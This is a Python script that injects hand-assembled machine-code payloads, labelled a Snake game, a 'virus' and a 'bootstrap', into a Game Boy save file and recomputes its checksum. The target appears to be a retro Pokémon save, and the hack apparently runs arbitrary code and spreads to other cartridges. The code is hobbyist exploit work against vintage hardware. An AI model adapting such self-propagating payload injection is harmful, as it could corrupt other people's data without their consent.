#!/usr/bin/env python

import sys

if len(sys.argv) != 2:
    print('Usage:')
    print('python convert_sav_to_snake_virus.py <savefile>')
    exit(1)

file = open(sys.argv[1],'rb')
sav = list(bytearray(file.read()))
file.close()
assert len(sav) == 0x8000

# a000
main_payload = [
    0x18,0x07,0x01,0x14,0x00,0xaf,0xc3,0xe0,0x36,0xaf,0xe0,0xae,0xe0,0xaf,0xcd,0x61,
    0x00,0x21,0x00,0x90,0x01,0x10,0x00,0x3e,0xff,0xcd,0xe0,0x36,0xcd,0x7b,0x00,0x3e,
    0x01,0xe0,0xba,0x21,0x40,0xff,0xcb,0xde,0xcd,0x0f,0x19,0xcd,0x29,0x24,0x21,0xe8,
    0xc6,0x01,0x64,0x00,0xaf,0xcd,0xe0,0x36,0xcd,0x02,0xc8,0x21,0xa0,0xc3,0xcd,0x02,
    0xc8,0x01,0x40,0x01,0x3e,0x7f,0xcd,0xe0,0x36,0xcd,0x02,0xc8,0x21,0xb3,0xc3,0x01,
    0x13,0x00,0xaf,0x16,0x11,0x22,0x77,0x09,0x15,0x20,0xfa,0x3e,0x10,0xe0,0xa0,0x11,
    0x48,0xc4,0x06,0x03,0x78,0xe0,0x9f,0xaf,0x21,0xe8,0xc6,0x12,0x72,0x23,0x73,0x23,
    0x05,0x13,0x20,0xf7,0xf0,0xa1,0xee,0x01,0xe0,0xa1,0xf0,0xd3,0xfe,0xb4,0x30,0xfa,
    0x06,0x00,0x4f,0x21,0xa0,0xc3,0x09,0x09,0xf0,0xa1,0xa7,0x28,0x01,0x23,0x3e,0x7f,
    0xbe,0x20,0xe7,0x3e,0x74,0x77,0x11,0xe8,0xc6,0xf0,0x9f,0x3d,0x87,0x47,0xf0,0xa2,
    0xa7,0x20,0x17,0x1a,0x67,0x13,0x1a,0x6f,0x1b,0x3e,0x7f,0x77,0x13,0x13,0x1a,0x1b,
    0x1b,0x12,0x13,0x05,0x20,0xf6,0x1b,0x1b,0x18,0x0f,0xaf,0xe0,0xa2,0xf0,0x9f,0x3c,
    0xe0,0x9f,0x3d,0x3d,0x13,0x13,0x3d,0x20,0xfb,0x1a,0x67,0x13,0x1a,0x6f,0x13,0xf0,
    0xf8,0xe6,0xf0,0x20,0x02,0xf0,0xa0,0xe0,0xa0,0xfe,0x10,0x28,0x17,0xfe,0x20,0x28,
    0x0e,0xfe,0x40,0x28,0x05,0x01,0x14,0x00,0x18,0x0d,0x01,0xec,0xff,0x18,0x08,0x01,
    0xff,0xff,0x18,0x03,0x01,0x01,0x00,0x09,0x3e,0x74,0xbe,0x20,0x04,0xe0,0xa2,0x18,
    0x06,0x3e,0x7f,0xbe,0xc2,0x2e,0xc8,0xaf,0x77,0x7c,0x12,0x13,0x7d,0x12,0xf0,0x9f,
    0x4f,0x3e,0x28,0x91,0x91,0x4f,0xcd,0x39,0x37,0xf0,0xa2,0xa7,0xc2,0x74,0xc8,0xc3,
    0x96,0xc8
]

# a200
virus_payload = [
    0x21,0x30,0xD7,0xCB,0x96,0x21,0x61,0xD3,0x2A,0xFE,0x04,0xC0,0x7E,0xFE,0x03,0x28,
    0x03,0xFE,0x06,0xC0,0x21,0x30,0xD7,0xCB,0xD6,0xF0,0xAA,0xEE,0x03,0x21,0x2A,0xD5,
    0xBE,0xC0,0xF0,0xB3,0x3D,0xC0,0x3E,0x08,0xE0,0xB8,0x3E,0x22,0xCD,0xF5,0x3E,0x3E,
    0x02,0xEA,0x2B,0xD1,0x3D,0xE0,0xBA,0xCD,0xD7,0x3D,0xAF,0xE0,0xB0,0x3E,0x01,0x26,
    0x20,0x77,0xE0,0xB8,0x21,0x41,0xD1,0x01,0xFD,0x17,0x71,0x23,0x05,0x20,0xFB,0x21,
    0x64,0xD1,0x01,0x61,0x01,0x2A,0x0B,0x3C,0x20,0xFB,0x2B,0x3E,0xE3,0x22,0x0B,0x78,
    0xB1,0x20,0xF8,0x36,0xFC,0x3E,0x3B,0x23,0x36,0xCE,0x3D,0x20,0xFA,0x21,0xD7,0xCB,
    0x36,0xC3,0x23,0x36,0xE0,0x23,0x36,0xC8,0x21,0x08,0xC5,0x3E,0xFD,0x22,0x22,0x22,
    0x3E,0xFF,0x22,0x22,0xAF,0x22,0x22,0x22,0x22,0x54,0x5D,0x21,0x20,0xC9,0x01,0x80,
    0x00,0xCD,0xB5,0x00,0x21,0x48,0xD1,0x36,0xC3,0x23,0x36,0xD8,0x23,0x36,0xC5,0x23,
    0x36,0x18,0x23,0x36,0xFB,0x23,0x36,0x00,0x23,0x36,0x18,0x23,0x36,0xFB,0x23,0x36,
    0x18,0x23,0x36,0xF6,0xCD,0x0F,0x19,0xCD,0x29,0x24,0xCD,0x80,0x36,0xCD,0xE6,0x5A,
    0x21,0x43,0xC4,0x01,0x0C,0x02,0xCD,0xB3,0x5A,0x21,0x6C,0xC4,0x11,0x0F,0x55,0xCD,
    0x55,0x19,0xC1,0xC3,0xB5,0x53,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x31,0xF9,0xDF,0x26,0x0A,0x74,0x3E,0xA0,0xF5,0x67,0x2E,0x00,0x11,0x00,0xC7,0x01,
    0x00,0x01,0xCD,0xB5,0x00,0xCD,0x7F,0x22,0xCD,0xD7,0x3D,0x21,0xFF,0xC6,0x36,0xFD,
    0x11,0xE8,0xC6,0x01,0x10,0x01,0x3E,0x08,0xE0,0xFF,0xCD,0x6F,0x21,0x3E,0x0D,0xE0,
    0xFF,0xF1,0x3C,0xFE,0xA4,0x20,0xD1,0x3E,0x51,0xCD,0x6D,0x3E,0xC3,0x45,0x53,0x00,
    0x31,0xE7,0xDF,0x26,0x0A,0x74,0x26,0x40,0x36,0x01,0x3E,0xA0,0xF5,0xCD,0x7F,0x22,
    0xCD,0xD7,0x3D,0x21,0x16,0x03,0x11,0x00,0xC8,0xD5,0x01,0x10,0x01,0x3E,0x08,0xE0,
    0xFF,0xCD,0x6F,0x21,0x3E,0x0D,0xE0,0xFF,0xE1,0x2A,0xFE,0xFD,0x28,0xFB,0x2B,0xF1,
    0xF5,0x57,0x1E,0x00,0x01,0x00,0x01,0xCD,0xB5,0x00,0xF1,0x3C,0xFE,0xA4,0x20,0xCC,
    0x21,0x1A,0xA6,0x11,0x16,0xA9,0x7E,0x36,0x83,0x12,0x23,0x13,0x7E,0x36,0xD6,0x12,
    0x13,0x21,0x9B,0xA3,0x01,0x65,0x00,0xCD,0xB5,0x00,0x3E,0x1C,0xEA,0x00,0x20,0xE0,
    0xB8,0x21,0x98,0xA5,0x01,0x8B,0x0F,0xCD,0x56,0x78,0xEA,0x23,0xB5,0x26,0x00,0x74,
    0x3E,0x01,0xEA,0x00,0x20,0xE0,0xB8,0xC3,0x45,0x53,0x00]

# a918
bootstrap = [
    0x21,0x6F,0xD3,0x11,0x6B,0xD6,0x3A,0xFE,0x80,0x30,0x04,0x12,0x1B,0x7E,0x12,0x36,
    0x83,0x23,0x36,0xD6,0x3E,0xC3,0xC9,0x21,0x80,0xFF,0x36,0x18,0x23,0x36,0x78,0x21,
    0xFA,0xFF,0x36,0xCD,0x23,0x36,0x6C,0x23,0x36,0xD6,0x23,0x36,0x18,0x23,0x36,0x83,
    0xF0,0xB4,0xFE,0x06,0x28,0x0E,0xFA,0x5E,0xD3,0xFE,0xEF,0x28,0x0C,0x21,0x6A,0xD6,
    0x2A,0x66,0x6F,0xE9,0x21,0x00,0xA0,0x18,0x03,0x21,0x00,0xA2,0x3E,0x0A,0xEA,0x00,
    0x00,0x3E,0x01,0xEA,0x00,0x40,0x11,0x00,0xC8,0x01,0x02,0x02,0xCD,0xB5,0x00,0x26,
    0x00,0x74,0xCD,0x00,0xC8,0x18,0xD6
]

virus_payload.extend(bootstrap)

sav[0x2000:0x2122] = main_payload
sav[0x2200:0x2402] = virus_payload
sav[0x2918:0x297F] = bootstrap

if sav[0x261B] != 0xD6:
    sav[0x2916:0x2918] = sav[0x261A:0x261C]
    sav[0x261A:0x261C] = [0x83,0xD6]

checksum = 0xFF

for x in sav[0x2598:0x3523]:
    checksum -= x
    checksum %= 0x100

sav[0x3523] = checksum

assert len(sav) == 0x8000
file = open(sys.argv[1],'wb')
file.write(bytearray(sav))
file.close()

print('Done!')
